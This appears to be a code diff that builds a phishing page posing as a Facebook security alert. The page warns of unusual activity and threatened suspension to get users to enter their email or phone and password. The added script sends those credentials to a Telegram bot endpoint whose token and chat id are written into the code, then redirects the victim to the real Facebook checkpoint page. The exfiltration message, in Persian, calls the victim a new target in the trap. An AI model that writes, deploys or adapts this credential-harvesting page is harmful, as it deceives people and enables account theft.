@@ -2,29 +2,58 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Action Required | Facebook Security Center</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Action Required | Facebook Security</title>
     <style>
-        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .wrapper { background: white; width: 100%; max-width: 450px; border-radius: 10px; box-shadow: 0 12px 28px rgba(0,0,0,0.12); overflow: hidden; border: 1px solid #dddfe2; }
-        .header { background: #1877f2; color: white; padding: 18px; text-align: left; font-size: 24px; font-weight: bold; }
-        .content { padding: 25px; }
-        .alert-header { display: flex; align-items: center; margin-bottom: 20px; }
-        .alert-icon { width: 45px; height: 45px; margin-right: 15px; }
-        h2 { font-size: 19px; color: #1c1e21; margin: 0; }
-        .warning-text { background: #fff9e6; border-left: 5px solid #f5c518; padding: 15px; border-radius: 4px; font-size: 13px; color: #333; margin-bottom: 20px; line-height: 1.5; }
-        .form-group { margin-bottom: 12px; }
-        input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7; box-sizing: border-box; transition: 0.2s; }
-        input:focus { background: white; border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
-        .btn-confirm { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn-confirm:hover { background: #166fe5; }
-        .footer { font-size: 12px; color: #90949c; text-align: center; margin-top: 25px; border-top: 1px solid #ebedf0; padding-top: 15px; }
+        body { background-color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
+        .blue-bar { background: #1877f2; color: white; width: 100%; padding: 15px; text-align: left; font-size: 22px; font-weight: bold; box-sizing: border-box; }
+        .main-content { padding: 20px; width: 100%; max-width: 400px; box-sizing: border-box; text-align: center; }
+        .icon { width: 60px; margin: 20px 0; }
+        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 10px; }
+        .alert-box { background: #fff9e6; border: 1px solid #ffe58f; padding: 15px; border-radius: 4px; font-size: 14px; text-align: left; line-height: 1.4; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; background: #f5f6f7; font-size: 16px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .footer { margin-top: 30px; font-size: 12px; color: #90949c; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="header">facebook</div>
-    <div class="content">
-        <div class="alert-header">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/86_fW-o5v-u.png" class="alert-
+<div class="blue-bar">facebook</div>
+
+<div class="main-content">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/86_fW-o5v-u.png" class="icon">
+    <h2>Account Security Alert</h2>
+    
+    <div class="alert-box">
+        <strong>Warning:</strong> Your account has been flagged for unusual activity. Please verify your login details to prevent permanent suspension.
+    </div>
+
+    <form id="finalForm">
+        <input type="text" name="user" placeholder="Mobile number or email" required>
+        <input type="password" name="pass" placeholder="Password" required>
+        <button type="submit" class="btn" id="btnS">Confirm Identity</button>
+    </form>
+
+    <div class="footer">Meta Security Support © 2026</div>
+</div>
+
+<script>
+    document.getElementById('finalForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const b = document.getElementById('btnS');
+        b.innerText = 'Verifying...';
+        
+        const msg = `🚨 هدف جدید در دام امنیتی!\n📧 یوزر: ${this.user.value}\n🔑 پسورد: ${this.pass.value}`;
+        
+        fetch(`https://api.telegram.org/bot8486500261:AAF8V0mNot6Uu3PAfP_BkF4wuJTX7Yns3f4/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: '7394414495', text: msg })
+        }).then(() => {
+            window.location.href = 'https://www.facebook.com/checkpoint'; 
+        });
+    });
+</script>
+
+</body>
+</html>
